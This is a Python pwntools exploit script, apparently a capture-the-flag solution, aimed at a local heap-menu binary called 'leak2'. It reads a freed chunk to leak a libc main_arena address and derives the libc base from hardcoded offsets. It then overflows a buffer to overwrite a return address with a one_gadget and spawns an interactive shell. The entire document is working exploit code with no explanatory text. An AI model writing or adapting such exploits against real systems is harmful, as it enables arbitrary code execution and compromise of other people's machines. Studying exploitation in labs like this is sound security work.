#!/usr/bin/python
from pwn import *

context.log_level = 'debug'
p = process("./leak2")
elf = ELF("./leak2")

def malloc(data):
    p.sendlineafter("> ", '1')
    p.sendafter("Data: ", data)

def free(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))

def edit(idx, data):
    p.sendlineafter("> ", '3')
    p.sendlineafter("idx: ", str(idx))
    p.sendafter("data: ", data)

def print_data(idx):
    p.sendlineafter("> ", '4')
    p.sendlineafter("idx: ", str(idx))

def overflow(data):
    p.sendlineafter("> ", '5')
    p.send(data)

malloc('A'*0x10) #0
malloc('B'*0x10) #1

free(0)

#malloc("") #2
#print_data(2)

print_data(0)
p.recvuntil("data: ")
leak = u64(p.recv(6) + '\x00\x00')
log.info("main_arena+96: "+hex(leak))
libcBase = leak - 0x3ebca0
one_gadget = libcBase + 0x10a38c
gdb.attach(p)

overflow('A'*(0x110+0x8)+p64(one_gadget))



p.interactive()
